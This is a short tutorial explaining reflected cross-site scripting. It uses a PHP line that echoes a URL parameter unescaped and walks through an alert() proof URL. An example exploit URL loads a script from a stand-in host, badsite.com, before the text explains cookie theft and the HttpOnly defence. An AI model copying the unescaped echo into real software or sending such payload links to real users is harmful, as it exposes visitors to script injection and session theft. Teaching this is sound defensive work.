XSS vulnerability example:

```php
echo "The value you entered is: " . $_GET['val'];
```

So why is this an XSS vulnerability? The way the above code works is it grabs a value from the URL and writes it back to the browser, unvalidated and unfiltered. If your application is hosted at https://example.com/test.php a site visitor might visit the following URL:

`https://example.com/test.php?val=123`

They will then see: “The value you entered is: 123” output into their browser. Probably the way the application was designed to work.

If someone visits the following URL:

`https://example.com/test.php?val=<script>alert(‘Proof this is an XSS’);</script>`

They will see the following in the browser: “The value you entered is:” and they will also see an alert box pop up saying “Proof this is an XSS”.

### Why is unfiltered output dangerous?
When an analyst sends you an alert() box as proof of a security vulnerability, they are showing that they can execute arbitrary javascript code in the browser. What they are really demonstrating is that by sending that URL to someone else, they can get that other person to execute arbitrary javascript in a browser.

One version of an exploit might look something like this:

`https://example.com/test.php?val=<script src=”http://badsite.com/badscript.js”></script>`

The attacker will send that link to a victim and steals information from the victim's site.

The script will have full access to the browser DOM environment including any HTTP cookie not protected by the HttpOnly flag.

Before Internet Explorer version 6SP1, cookies were accessible both to web servers when a browser made a request, and to javascript. In other words, a script running in the browser on a particular website could simply read all cookies that the website had set.

This provided much flexibility to developers but also allowed malicious scripts to read cookie values and send them anywhere on the Internet. If an attacker was able to exploit an XSS vulnerability, the first thing they would do would be to steal any cookies they could read. This would allow them to gain instant administrative level access to websites if the victim was signed into the target website as an administrator.

Cookies included with the HttpOnly flag is not be readable by javascript

WordPress also uses the HttpOnly flag to protect cookies, which prevents an attacker exploiting an XSS vulnerability from stealing sensitive cookies.